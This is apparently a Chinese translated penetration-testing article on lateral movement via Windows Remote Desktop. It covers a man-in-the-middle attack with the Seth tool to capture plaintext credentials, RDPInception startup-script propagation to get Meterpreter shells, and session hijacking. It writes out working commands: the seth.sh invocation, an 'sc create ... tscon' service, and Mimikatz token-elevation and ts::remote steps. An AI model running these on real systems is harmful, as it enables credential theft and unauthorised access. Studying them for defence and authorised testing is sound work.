**远程桌面协议（RDP）被广泛应用于管理员的内部网络。该协议允许系统所有者以及管理员远程管理其Windows环境。然而，RDP在为我们带来方便的同时，也为虎视眈眈的攻击者打开了一扇窗，攻击者常会利用该协议肆意的在内部网络中漫游。以下攻击，可让攻击者获取凭据劫持其他用户的RDP会话，并向那些使用RDP作为验证机制的受感染工作站远程系统执行任意代码。**

## RDP中间人攻击

中间人攻击是攻击者用于获取凭据常用的手段和方式。对RDP会话执行此攻击，攻击者将能轻松地获取到可用于内网渗透的域帐户的明文密码。[Seth](https://github.com/SySS-Research/Seth)是一种可以帮助你自动执行RDP中间人攻击的工具，无论目标是否启用了网络级身份验证（NLA），它都将为你完美的执行。我们只需提供四个必要参数即可：

>   1. 以太网接口
>   2. 攻击者的IP
>   3. 受害者工作站的IP（客户端）
>   4. 目标RDP主机（服务器）的IP
>

    
    
    ./seth.sh eth0 10.0.0.2 10.0.0.3 10.0.0.1

![seth-man-in-the-middle.png](https://image.3001.net/images/20180427/15247881887136.png!small)

成功执行后，该工具将在后台执行一系列的步骤，以确保攻击的成功实施。以下是执行的相关流程：

>   1. 欺骗ARP回复
>   2. 启用IPv4流量转发，将流量从受害主机重定向到攻击者机器，然后再转发到目标RDP服务器。
>   3. 配置一个iptable规则拒绝SYN数据包，以防止直接的RDP认证。
>   4. 捕获目标主机的SYN数据包。
>   5. 克隆SSL证书。  
> 重新配置iptables规则，以将流量从受害工作站路由到目标RDP主机。
>   6. 阻止到端口88的流量，以将Kerberos身份验证降级到NTLM。
>

步骤1-3将在受害者身份验证之前执行。尝试通过RDP向目标服务器进行身份验证的用户将会收到以下消息：

![remote-desktop-connection-certificate-errors.png](https://image.3001.net/images/20180427/15247882074157.png!small)

当用户建立连接时，其凭据将以明文形式显示给攻击者。

![seth-rdp-password-in-plain-text.png](https://image.3001.net/images/20180427/15247882297835.png!small)

## RDP Inception

RDPInception是[MDSec发现的一种攻击方式](https://www.mdsec.co.uk/2017/06/rdpinception/)。其主要是基于“启动（Startup）”程序，也就是利用大家熟知的“启动项”目录，强制登录进入RDP访客计算机执行恶意代码。为此，MDSec还开发了RDPInception的PoC验证程序，一个简单的[批处理脚本](https://github.com/mdsecactivebreach/RDPInception/)。在攻击者已经获得访问权限的工作站上执行批处理脚本，攻击者将会获取到一个shell。

![rdp-inception-executing-bat-file.png](https://image.3001.net/images/20180427/15247882487507.png!small)

如果提权用户（管理员或域管理员）尝试通过RDP与已感染的主机进行身份验证，则批处理脚本将会被系统上的其他用户复制。

![rdp-inception-administrator-connects-to-workstation-via-rdp.png](https://image.3001.net/images/20180427/15247882747020.png!small)

批处理脚本将会在工作站每次启动时执行，以实现后门持久化。

![rdp-inception-propagation-of-code.png](https://image.3001.net/images/20180427/15247882975585.png!small)

当通过RDP向受感染主机验证的提权用户重启他的机器时，代码将被执行。

![rdp-inception-code-execution-on-the-dc.png](https://image.3001.net/images/20180427/15247883312759.png!small)

新的Meterpreter会话将在管理员的主机上，通过RDP服务的滥用被打开，而不需要直接攻击该系统。

![rdp-inception-meterpreter-on-the-dc.png](https://image.3001.net/images/20180427/15247883513141.png!small)

active Meterpreter sessions列表，将验证攻击者是否可以在两个系统上访问。

![rdp-inception-meterpreter-active-sessions.png](https://image.3001.net/images/20180427/15247883826666.png!small)

## RDP会话劫持

如果攻击者在目标系统上获得本地管理员访问权限，则可能劫持其他用户的RDP会话。这也解决了攻击者对该用户的凭据需求。这项技术最初是由[Alexander
Korznikov](https://twitter.com/nopernik)发现的，在他的[博客](http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html)中已有描述。

可使用的可用会话列表可以在Windows任务管理器中的“ **Users** “选项卡中查看。

![rpd-sessions-gui.png](https://image.3001.net/images/20180427/15247884088091.png!small)

也可以从命令提示符中获取相同的信息。

    
    
    query user

![1rdp-sessions-terminal.png](https://image.3001.net/images/20180427/1524788486254.png!small)

创建一个使用系统级权限执行tscon的服务，将劫持ID为3的会话。

    
    
    sc create sesshijack binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#0"
    net start sesshijack

![2rdp-session-hijacking-via-service.png](https://image.3001.net/images/20180427/15247885073615.png!small)

当服务启动时，用户“ **test** ”可以在不知道他密码的情况下使用netbiosX的会话。

![3rdp-session-hijacking-via-service-netbiosx-user.png](https://image.3001.net/images/20180427/1524788530619.png!small)

Mimikatz也支持这种技术。 第一步是检索终端服务会话列表。

    
    
    ts::sessions

![4mimikatz-terminal-services-sessions1.png](https://image.3001.net/images/20180427/15247885497051.png!small)

尝试直接使用会话1将失败，因为Mimikatz并未以SYSTEM权限执行。因此，下列命令将会将token从本地管理员提升到SYSTEM。这样一来，当再次使用其他会话时，将不需要提供用户的密码。

    
    
    ts::remote /id:1
    privilege::debug
    token::elevate

![5mimikatz-rdp-session-hijacking.png](https://image.3001.net/images/20180427/15247885735735.png!small)

再次执行以下命令，将成功劫持netbiosX用户的会话。

    
    
    ts::remote /id:1

![6mimikatz-rdp-session-of-netbiosx.png](https://image.3001.net/images/20180427/15247885981463.png!small)

 ***参考来源：[pentestlab](https://pentestlab.blog/2018/04/24/lateral-movement-rdp/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**  

